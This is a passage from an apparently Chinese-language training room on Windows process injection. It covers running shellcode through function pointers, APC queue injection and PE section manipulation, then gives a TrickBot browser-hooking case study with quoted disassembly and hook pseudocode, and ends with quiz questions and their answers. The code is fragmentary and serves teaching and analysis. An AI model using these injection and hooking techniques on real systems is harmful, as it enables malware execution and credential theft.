<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">void</span><span class="token punctuation" style="color:#393A34">(</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">addressPointer</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这个单行代码比较紧凑，不易理解，我们可以拆解其组成部分进行解析：</p>
<ol>
<li>创建函数指针，标红部分：<code>(void(*)())</code></li>
<li>将已分配的内存指针或 shellcode 数组转换为函数指针，标黄部分：<code>(&lt;function pointer&gt;)addressPointer)</code></li>
<li>调用函数指针执行 shellcode，标绿部分：<code>();</code></li>
</ol>
<p>此技术适用于特定的场景，并且在需要时可提供较强的隐蔽性。</p>
<hr>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="异步过程调用asynchronous-procedure-callsapc"><strong>异步过程调用（Asynchronous Procedure Calls，APC）</strong><a href="#异步过程调用asynchronous-procedure-callsapc" class="hash-link" aria-label="Direct link to 异步过程调用asynchronous-procedure-callsapc" title="Direct link to 异步过程调用asynchronous-procedure-callsapc">​</a></h3>
<p>根据 <a href="https://docs.microsoft.com/en-us/windows/win32/sync/asynchronous-procedure-calls" target="_blank" rel="noopener noreferrer">Microsoft 文档</a> 的定义：“异步过程调用（APC）是一种在特定线程上下文中异步执行的函数。”</p>
<p>APC 通过 <code>QueueUserAPC</code> 将函数排入队列。一旦排队，APC 触发软件中断，并在该线程下一次被调度时执行该函数。</p>
<p>在用户模式（userland）应用程序中，线程必须处于“<em>可警报状态</em>”（alertable state）才能接受 APC 调用。可警报状态意味着线程正在等待回调，例如 <code>WaitForSingleObject</code> 或 <code>Sleep</code>。</p>
<p>现在，我们来看如何滥用 APC 技术进行恶意执行。以下代码示例使用 <code>VirtualAllocEx</code> 和 <code>WriteProcessMemory</code> 进行内存分配和写入：</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token function" style="color:#d73a49">QueueUserAPC</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">PAPCFUNC</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">addressPointer</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// APC函数指针，指向由winnt定义的已分配内存</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	pinfo</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">hThread</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// PROCESS_INFORMATION结构体中线程的句柄</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">ULONG_PTR</span><span class="token punctuation" style="color:#393A34">)</span><span class="token constant" style="color:#36acaa">NULL</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">ResumeThread</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	pinfo</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">hThread </span><span class="token comment" style="color:#999988;font-style:italic">// PROCESS_INFORMATION结构体中线程的句柄</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token function" style="color:#d73a49">WaitForSingleObject</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	pinfo</span><span class="token punctuation" style="color:#393A34">.</span><span class="token plain">hThread</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// PROCESS_INFORMATION结构体中线程的句柄</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	INFINITE </span><span class="token comment" style="color:#999988;font-style:italic">// 无限等待，直到被警报触发</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这种技术是线程执行的一个不错替代方案，但近年来已成为检测工程的重点，许多安全产品已经实现了针对 APC 滥用的检测机制。因此，该方法的适用性取决于目标环境的防御措施。</p>
<hr>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="节section操作section-manipulation"><strong>节（Section）操作（Section Manipulation）</strong><a href="#节section操作section-manipulation" class="hash-link" aria-label="Direct link to 节section操作section-manipulation" title="Direct link to 节section操作section-manipulation">​</a></h3>
<p>在恶意软件分析中，PE（<strong>P</strong>ortable <strong>E</strong>xecutable，可移植可执行文件）格式及其节操作是一种常见的技术。PE 格式定义了 Windows 可执行文件的结构，而在执行方面，我们主要关注的是 <code>.data</code> 和 <code>.text</code> 节。此外，表格（tables）和节指针（section pointers）也是常用于执行数据的方法。</p>
<p>我们不会深入探讨这些技术，因为它们相对复杂，需要详细的技术解析。这里仅介绍基本原理。</p>
<p>要进行节操作，首先需要获取 PE 文件的转储（dump），通常可以通过 <code>xxd</code> 读取 DLL 或其他恶意文件来完成。</p>
<p>本质上，节操作的核心是通过数学计算解析物理十六进制数据，并将其转换为 PE 数据。</p>
<p>常见的节操作技术包括：</p>
<ul>
<li><strong>RVA（相对虚拟地址）入口点解析</strong>（RVA entry point parsing）</li>
<li><strong>节映射</strong>（Section mapping）</li>
<li><strong>重定位表解析</strong>（Relocation table parsing）</li>
</ul>
<hr>
<p>在所有注入技术中，攻击者可以自由组合和混合各种公开研究过的方法，从而创造出无限多的执行方案，以规避检测并成功执行恶意代码。</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>用于在线程上下文中异步执行的协议是什么？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Asynchronous Procedure Call</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>用于将 APC 函数排队的 Windows API 调用是什么？</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">QueueUserAPC</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>空函数指针可以用于远程进程吗？(y/n)</p><div class="codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-text codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">n</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="case-study-in-browser-injection-and-hooking---浏览器注入与挂钩的案例分析">Case Study in Browser Injection and Hooking - 浏览器注入与挂钩的案例分析<a href="#case-study-in-browser-injection-and-hooking---浏览器注入与挂钩的案例分析" class="hash-link" aria-label="Direct link to Case Study in Browser Injection and Hooking - 浏览器注入与挂钩的案例分析" title="Direct link to Case Study in Browser Injection and Hooking - 浏览器注入与挂钩的案例分析">​</a></h2>
<p>为了深入了解进程注入的影响，我们可以观察TrickBot的TTP（<strong>T</strong>actics、<strong>T</strong>echniques和<strong>P</strong>rocedures）。</p>
<p>初步研究来源：<a href="https://www.sentinelone.com/labs/how-trickbot-malware-hooking-engine-targets-windows-10-browsers/" target="_blank" rel="noopener noreferrer"><em>SentinelLabs</em></a></p>
<p>TrickBot是一种知名的银行木马，最近在金融犯罪软件中重新流行起来。我们将观察的恶意软件主要功能是浏览器钩取。浏览器钩取使得恶意软件能够钩取有趣的API调用，这些调用可以用来拦截/窃取凭证。</p>
<p>为了开始我们的分析，让我们看看它们如何针对浏览器。根据<em>SentinelLabs</em>的逆向工程，可以明确看到它用于获取常见浏览器路径的句柄；在下面的反汇编代码中可以看到<code>OpenProcess</code>的调用。</p>
<div class="language-wasm codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-wasm codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">push   eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">push   0</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">push   438h</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">call   ds:OpenProcess</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov    edi, eax</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov    [edp,hProcess], edi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">test   edi, edi</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">jz     loc_100045EE</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">push   offset Srch            ; &quot;chrome.exe&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">lea    eax, [ebp+pe.szExeFile]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov    eax, ecx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">push   offset aIexplore_exe   ; &quot;iexplore.exe&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">push   eax                    ; lpFirst</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov    eax, ecx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">push   offset aFirefox_exe   ; &quot;firefox.exe&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">push   eax                    ; lpFirst</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">...</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">mov    eax, ecx</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">push   offset aMicrosoftedgec   ; &quot;microsoftedgecp.exe&quot;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">...</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>当前的反射注入源代码不太清楚，但<em>SentinelLabs</em>已经概述了注入的基本程序流程如下。</p>
<ol>
<li>打开目标进程，<code>OpenProcess</code></li>
<li>分配内存，<code>VirtualAllocEx</code></li>
<li>将函数拷贝到分配的内存中，<code>WriteProcessMemory</code></li>
<li>将Shellcode拷贝到分配的内存中，<code>WriteProcessMemory</code></li>
<li>刷新缓存以提交更改，<code>FlushInstructionCache</code></li>
<li>创建远程线程，<code>RemoteThread</code></li>
<li>恢复线程或回退到创建一个新的用户线程，<code>ResumeThread</code>或<code>RtlCreateUserThread</code></li>
</ol>
<p>一旦注入，TrickBot将调用其复制到内存中的<em>钩子安装程序函数</em>。<em>SentinelLabs</em>提供了以下安装程序函数的伪代码。</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">relative_offset </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> myHook_function </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_DWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">original_function </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">5</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">v8 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> __int8</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">original_function</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">5</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">trampoline_lpvoid </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">original_function </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">jmp_32_bit_relative_offset_opcode </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xE9u</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain">		</span><span class="token comment" style="color:#999988;font-style:italic">// &quot;0xE9&quot; -&gt; 跳转指令的32位相对偏移码</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token keyword" style="color:#00009f">if</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain"> </span><span class="token function" style="color:#d73a49">VirtualProtectEx</span><span class="token punctuation" style="color:#393A34">(</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">HANDLE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token number" style="color:#36acaa">0xFFFFFFFF</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> trampoline_lpvoid</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> v8</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x40u</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">flOldProtect</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">	</span><span class="token comment" style="color:#999988;font-style:italic">// 使用VirtualProtectEx设置函数为“PAGE_EXECUTE_READWRITE”</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"></span><span class="token punctuation" style="color:#393A34">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	v10 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_DWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">original_function </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	v11 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> __int8</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">original_function</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">5</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_DWORD</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">original_function </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x47</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	original_function</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">66</span><span class="token punctuation" style="color:#393A34">]</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0xE9u</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_DWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">original_function </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">0x43</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> v10 </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> v11</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token function" style="color:#d73a49">write_hook_iter</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">v10</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">jmp_32_bit_relative_offset_opcode</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">5</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"> </span><span class="token comment" style="color:#999988;font-style:italic">// -&gt; 手动写入钩子</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">	</span><span class="token function" style="color:#d73a49">VirtualProtectEx</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">		</span><span class="token comment" style="color:#999988;font-style:italic">// 恢复原始保护状态</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">HANDLE</span><span class="token punctuation" style="color:#393A34">)</span><span class="token number" style="color:#36acaa">0xFFFFFFFF</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">LPVOID </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">original_function </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> __int8</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">original_function</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">5</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		flOldProtect</span><span class="token punctuation" style="color:#393A34">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">		</span><span class="token operator" style="color:#393A34">&amp;</span><span class="token plain">flOldProtect</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">result </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>让我们拆解这段代码，虽然刚开始看起来可能有些复杂，但它可以被拆解成我们在本课程中获得的一些较小的知识块。</p>
<p>我们看到的第一部分有趣的代码可以被识别为函数指针；你可能会记得之前任务中关于调用函数指针的内容。</p>
<div class="language-cpp codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-cpp codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">relative_offset </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> myHook_function </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">_DWORD </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">original_function </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">1</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">-</span><span class="token plain"> </span><span class="token number" style="color:#36acaa">5</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">v8 </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">unsigned</span><span class="token plain"> __int8</span><span class="token punctuation" style="color:#393A34">)</span><span class="token plain">original_function</span><span class="token punctuation" style="color:#393A34">[</span><span class="token number" style="color:#36acaa">5</span><span class="token punctuation" style="color:#393A34">]</span><span class="token punctuation" style="color:#393A34">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">trampoline_lpvoid </span><span class="token operator" style="color:#393A34">=</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">(</span><span class="token keyword" style="color:#00009f">void</span><span class="token plain"> </span><span class="token operator" style="color:#393A34">*</span><span class="token operator" style="color:#393A34">*</span><span class="token punctuation" style="color:#393A34">)</span><span class="token punctuation" style="color:#393A34">(</span><span class="token plain">original_function </span><span class="token operator" style="color:#393A34">+</span><span class="token plain"> </span><span class="token number" 